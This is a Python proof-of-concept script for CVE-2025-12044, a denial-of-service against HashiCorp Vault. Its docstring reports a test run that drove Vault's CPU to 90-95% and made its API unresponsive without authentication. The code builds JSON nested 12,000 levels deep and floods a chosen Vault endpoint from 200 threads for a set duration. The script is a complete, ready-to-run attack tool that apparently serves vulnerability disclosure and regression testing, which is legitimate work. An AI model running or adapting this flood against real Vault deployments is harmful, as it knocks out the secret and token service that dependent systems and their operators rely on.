#!/usr/bin/env python3

"""
HashiCorp Vault JSON Parsing DoS Regression (CVE-2025-12044)

    Command: python3 CVE-2025-12044.py http://127.0.0.1:8200/v1/sys/init --threads 200 --depth 12000 --leaf-size 8192 --timeout 10 --duration 120
    Duration: 162.49s (artifacts/flood_run.log)
    Impact: Vault CPU usage jumped from ~0.4% idle to 90-95% during the flood (artifacts/vault_cpu_baseline_clean.txt vs. artifacts/vault_cpu_during_attack*.txt). top snapshots and vmstat confirm the process monopolised CPU, preventing responsive API calls.
    Goroutine dump (artifacts/goroutines_latest.txt) shows thousands of concurrent JSON decode stacks (e.g., github.com/hashicorp/vault/vendored/github.com/hashicorp/go-secure-stdlib/jsonutil.Decode), indicating workers stuck parsing.

Impact Assessment

    Availability: Entire Vault cluster becomes unresponsiveâ€”no secrets or tokens served.
    Authentication: Attack requires network access but no prior auth; dev server defaults are especially exposed.
    Integrity/Confidentiality: Not directly impacted but downstream systems relying on Vault are halted.

"""

import argparse
import json
import threading
import time
from typing import Dict

import requests


def make_nested(depth: int, leaf_size: int) -> Dict[str, object]:
    payload = {}
    cursor = payload
    for _ in range(depth):
        cursor['a'] = {}
        cursor = cursor['a']
    cursor['leaf'] = 'x' * leaf_size
    return payload


def worker(endpoint: str, depth: int, leaf_size: int, timeout: float, stop_time: float) -> None:
    payload = json.dumps(make_nested(depth, leaf_size))
    headers = {'Content-Type': 'application/json'}
    while time.time() < stop_time:
        try:
            requests.post(endpoint, data=payload, headers=headers, timeout=timeout)
        except Exception:
            pass


def main() -> None:
    parser = argparse.ArgumentParser(description="Vault JSON flood")
    parser.add_argument('endpoint', help='Vault HTTP endpoint (e.g. http://127.0.0.1:8200/v1/sys/init)')
    parser.add_argument('--threads', type=int, default=200)
    parser.add_argument('--depth', type=int, default=12000)
    parser.add_argument('--leaf-size', type=int, default=8192)
    parser.add_argument('--timeout', type=float, default=10.0)
    parser.add_argument('--duration', type=int, default=120, help='Attack duration in seconds')
    args = parser.parse_args()

    stop_time = time.time() + args.duration
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(args.endpoint, args.depth, args.leaf_size, args.timeout, stop_time),
            daemon=True,
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


if __name__ == '__main__':
    main()